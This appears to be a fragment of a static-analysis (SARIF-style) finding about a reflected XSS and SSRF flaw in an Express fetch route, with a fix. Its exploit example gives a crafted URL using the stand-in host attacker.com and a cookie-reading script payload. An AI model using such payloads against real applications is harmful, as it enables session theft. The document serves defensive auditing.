        {
          "ruleId": "javascript_express_cross_site_scripting",
          "level": "error",
          "message": {
            "text": "[CRITICAL] The application fetches content from a user-provided URL (`req.query.url`) using `axios.get()` and then directly sends the raw response data (`response.data`) back to the client using `res.send()`. This creates a severe Reflected Cross-Site Scripting (XSS) vulnerability, often compounded by Server-Side Request Forgery (SSRF). If an attacker provides a URL pointing to a malicious server that returns HTML containing JavaScript, that script will be executed in the victim's browser when they view the response, leading to session hijacking, credential theft, or defacement.\n\nExploit: An attacker crafts a URL like `http://localhost:3000/fetch?url=http://attacker.com/malicious.html`. The server would fetch `malicious.html` from `attacker.com`. If `malicious.html` contains `<script>alert(document.cookie)</script>`, the server then sends this content directly to the victim's browser via `res.send()`. The browser executes the JavaScript, potentially stealing the victim's session cookies or performing other malicious actions within the context of the application's domain.\n\nFix: Before sending any user-controlled or externally fetched content back to the browser, it must be thoroughly sanitized to remove any malicious scripts or HTML tags. If the content is expected to be plain text, ensure it is properly encoded (e.g., using `encodeURIComponent`). If HTML is expected, use a robust HTML sanitization library (like `DOMPurify` on the server-side) to remove dangerous elements and attributes. Additionally, the URL itself (`req.query.url`) must be strictly validated against an allowlist of trusted domains or patterns to mitigate the underlying Server-Side Request Forgery (SSRF) risk, preventing the server from fetching malicious content in the first place."
          },
